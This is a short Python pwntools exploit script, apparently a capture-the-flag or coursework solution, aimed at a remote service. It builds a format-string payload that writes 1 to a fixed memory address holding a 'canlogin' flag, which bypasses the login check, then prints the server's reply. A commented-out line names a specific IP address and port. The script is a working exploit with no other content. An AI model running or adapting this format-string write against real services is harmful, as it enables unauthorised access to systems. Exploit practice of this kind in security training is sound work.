#!/usr/bin/env python3

from pwn import *
import sys

server = sys.argv[1]
port = int(sys.argv[2])
r = remote(server, port)
# r = remote('140.113.207.243', 8886)
r.recvuntil(': ')
canlogin = 0x80e419c
a = fmtstr_payload(4, {canlogin :1})
r.sendline(a)
print(r.recvall(1).decode("utf-8", "ignore").strip())